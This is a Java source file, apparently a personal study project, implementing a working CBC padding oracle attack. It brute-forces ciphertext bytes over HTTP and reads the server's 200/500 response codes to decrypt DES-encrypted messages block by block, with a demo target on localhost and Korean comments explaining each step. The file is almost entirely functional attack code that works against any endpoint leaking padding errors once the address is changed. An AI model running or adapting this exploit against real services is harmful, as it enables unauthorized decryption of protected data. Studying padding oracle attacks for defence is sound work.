import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import util.ByteUtil;

/**
 * @author	Jae-Woong Moon(mjw8585@gmail.com)
 * @brief	
 * @Date	2018. 5. 14 ~ 2018.6.7	 
 */
public class BruteForceHacker {

	private String address;
	private String paramName;
	private int blockSize = 8; // DES block size

	public String getAddress() {
		return address;
	}

	public void setAddress(String address) {
		this.address = address;
	}

	public String getParamName() {
		return paramName;
	}

	public void setParamName(String paramName) {
		this.paramName = paramName;
	}

	public int getBlockSize() {
		return blockSize;
	}

	public void setBlockSize(int blockSize) {
		this.blockSize = blockSize;
	}

	public String hack(String totalCipher) throws UnsupportedEncodingException {
		int blockCnt = totalCipher.length() / (this.blockSize * 2);
		List<String> plainTexts = new ArrayList<String>();
		
		for(int i=blockCnt; i > 0; i--) {
			int blockNum = i;
			String targetCipherBlock = getTargetCipherBlock(totalCipher, blockNum);
			String targetCipher = getZeroBlock() + targetCipherBlock;
			String interBlock = getIntermidiateBlock(targetCipher);
			String previousCipherBlock = getTargetCipherBlock(totalCipher, blockNum-1);
			String plainText = new String(ByteUtil.hexToBytes(ByteUtil.xor(interBlock, previousCipherBlock)), "UTF-8");
			System.out.println("[Found!]" +i + "'th block value is :" + plainText);
			plainTexts.add(plainText);
		}
		return getReversedString(plainTexts);
	}
	
	private String getReversedString(List<String> list) {
		String result = "";
		for(int i= list.size()-1; i > -1; i--) {
			result += list.get(i);
		}
		return result;
	}
	
	private String getZeroBlock() {
		String result = "";
		for(int i=0; i < this.blockSize * 2; i++) {
			result += "0";
		}
		return result;
	}
	
	/**
	 * 타켓 블록을 얻어온다. 
	 * @param totalCipher
	 * @param blockNum 블록번호 (범위 : 1~ 마지막블록번호)
	 * @return
	 */
	private String getTargetCipherBlock(String totalCipher, int blockNum) {
		int blockCnt = totalCipher.length() / (this.blockSize * 2);
		if(blockNum > blockCnt) {
			return null;
		}
		if(blockNum == 0) {
			return getZeroBlock();
		}
		String targetCipher = totalCipher.substring((blockNum -1) * (blockSize*2), blockNum * (blockSize *2));
		//System.out.println("targetCipher : " + targetCipher);
		return targetCipher;
	}
	
	
	/**
	 * 원하는 블록의 중간 값을 얻어낸다.  
	 * @param totalCipher : 암호화된 전체 블록
	 * @param blockNum : 원하는 블록 번호 ex) 2
	 * @return
	 */
	private String getIntermidiateBlock(String totalCipher) {
		// STEP 1. 시작지점을 결정한다. 
		// 전체길이 - (블록크기 * 2) - 2  
		// 예를 들어 48 길이의 헥스라면 : 48 - 8 * 2 - 2 = 30 
		int startOffset = totalCipher.length() - this.blockSize * 2 - 2;
		
		// STEP 2. 마지막 바이트부터 시작해서 첫 바이트까지의 값을 얻어낸다. (blockSize만큼) 
		List<String> interValues = new ArrayList<String>();
		int paddingVal = 1;
		int stopOffset = startOffset - this.blockSize * 2;
		//System.out.println("startOffset : " + startOffset + ", stopOffset : " + stopOffset);
		for(int offset = startOffset; offset > stopOffset; offset= offset -2 ) {
			//System.out.println("paddingVal : " + paddingVal);
			// STEP 2-1. 변환된 암호문 값을 get
			String transCipher = getTranslatedCipher(totalCipher, paddingVal, interValues);
			
			// STEP 2-2. 결정된 파라메터 값을 가지고 bruteforce를 통해 중간값을 얻어낸다.
			String foundReqVal = bruteForce(transCipher, offset, paddingVal);
			String interVal = ByteUtil.xor("0"+paddingVal, foundReqVal);
			interValues.add(interVal);
			paddingVal ++;
		}

		// STEP 3. STEP 2에서 찾은 중간 값을 거꾸로 정렬한 값을 리턴한다. (뒤에서 부터 찾았으므로)  
		String interStr= getReversedString(interValues);
		return interStr;
	}
	
	/**
	 * 
	 * 시도하고자 하는 padding 단수에 맞춘 요청 암호 블록을 리턴한다.
	 * 	paddingVal 1인 경우 : 기본 값을 쓴다. 
		paddingVal 2인 경우 : 
		  1) 타겟 block의 마지막 바이트를 paddingVal ^ 마지막 바이트의 중간값으로 세팅한다.
		paddingVal 3인 경우
		  1) 타겟 block의 마지막 바이트를 paddingVal ^ 마지막 바이트의 중간값으로 세팅한다.
		  2) 타겟 block의 뒤에서 두번째 바이트를 paddingVal ^ 두번째 바이트의 중간값으로 세팅한다.
		   ...
	 * @param defaultCipher 기본 암호문
	 * @param paddingVal 패딩단계
	 * @param blockNum 기본 암호 블록에서 치환될 위치를 계산하는데 사용된다.
	 * @param interValues 치환될 중간값
	 * @return
	 */
	private String getTranslatedCipher(String defaultCipher, int paddingVal, List<String> interValues) {
		//System.out.println("interValues : " + interValues);
		String result = defaultCipher;
		if(paddingVal > 1) {
			for(int j=0; j < interValues.size() ; j++) {
				int targetOffset = defaultCipher.length() - this.blockSize * 2 - 2 - (j * 2);
				
				String sub1 = result.substring(0, targetOffset);
				String val = ByteUtil.xor("0" + paddingVal, interValues.get(j));  // <-- 바꿀 값
				
				//System.out.println((j+1) + ") " + result.substring(targetOffset, targetOffset + 2) + " is replaced to (" 
						//+ "0x0" + paddingVal +" ^ 0x" + interValues.get(j) + " = 0x" + val +")");
				
				String sub2 = result.substring(targetOffset+2);
				result = sub1 + val + sub2;
			}
		}
		return result;
	}
	
	/**
	 * byteOffset으로 지정된 위치의 헥스값을 바꿔가면서 브루트 포스를 시도한다. 
	 * 시도 중 서버에서 200응답이 출력되는 헥스값을 발견하면 그 값을 리턴한다.  
	 * @param defaultCipher 변환전(기본) 암호화된 블록 값
	 * @param paddingVal 패딩단계
	 * @param hexOffset 브루트포스할 위치 오프셋 
	 * @return
	 */
	private String bruteForce(String defaultCipher, int hexOffset, int paddingVal) {
		//System.out.println("bruteForce with Cipher:" + defaultCipher + " and hexOffset : " + hexOffset);
		
		String sub1 = defaultCipher.substring(0, hexOffset);
		String originVal = defaultCipher.substring(hexOffset, hexOffset+2); 
		String sub2 = defaultCipher.substring(hexOffset+2);
		
		// 시도하는 범위는 0x00 부터 0xFF 까지
		for(int i=0; i < 256; i++) {
			byte[] b = new byte[1];
			b[0] = (byte)i;
			String hexStr = ByteUtil.bytesToHex(b);
			String tryCipher = sub1 + hexStr + sub2;
			int resCode = getResponseCode(tryCipher);
			//System.out.println("tryCipher : " + tryCipher + ", result code : " + resCode);
			
			// 응답코드가 500이 아니라 200이면 제대로된 패딩을 만드는 값을 찾은 것으로 간주
			if(paddingVal == 1) {
				 //처음에 찾을 때(마지막 바이트)는 200이 나오는 경우가 두개이므로 조건 추가
				if(resCode == 200 && (!hexStr.equals(originVal))) { 
					//System.out.println("Found!!! : " + hexStr);  
					//System.out.println("==========================================");
					return hexStr;
				}
			}else {
				if(resCode == 200) { 
					//System.out.println("Found!!! : " + hexStr);
					//System.out.println("==========================================");
					return hexStr;
				}
			}
			
		}
		System.err.println("Couldn't Find!");
		return "";
	}
	
	/**
	 * 웹 서버에 HTTP 요청을 보낸 결과 응답 코드를 리턴한다. 
	 * @param paramValue
	 * @return http 응답 코드
	 * @throws IOException
	 */
	private int getResponseCode(String paramValue){
		URL url = null;
		HttpURLConnection con = null;
			
		try {
			String urlStr = this.address + "?" + this.paramName + "=" + paramValue;
			url = new URL(urlStr);
			con = (HttpURLConnection) url.openConnection();
			con.setRequestMethod("GET");
			con.setDoOutput(true);

		    return con.getResponseCode();
		}catch(Exception e) {
			e.printStackTrace();
		}finally {
			con.disconnect();
		}
	    return -1;
	}
	
	public static void main(String[] args) throws IOException{
		
		BruteForceHacker hacker = new BruteForceHacker();
		hacker.setAddress("http://localhost:8080/PaddingOracleServer/decrypt.jsp");
		hacker.setParamName("msg");
		hacker.setBlockSize(8);
		
		//String totalCipher = "5F24DD35CC079BA9970DBA343DF81F5A444B28E091B8DF25";
		//String totalCipher ="950431B3C1CD1C534B6FE3B4BF9F33D34F9A4589307AB959";
		//String totalCipher = "240148335AF2FD20D0C3A47A7AA89AFF9F58F952AF5A79AC";  // 평문: 한글도 되나요?
		String totalCipher = "D4933AC620BF62064099FB4EF04B881CD117E2C94285D69F";  // 평문: 日本語テスト
		
		// 첫번째 블록의 평문값은 어떻게 구할 수 있지? 중간값은 구했지만 IV값은 모르잖아. 
		// => 0 으로 채워진 이니셜벡터를 쓰니까 된다. 
		// IV 를 랜덤한 값으로 쓰는 경우는 불가능할 것이다.
		String hacked = hacker.hack(totalCipher);
		System.out.println(hacked);
	}
}
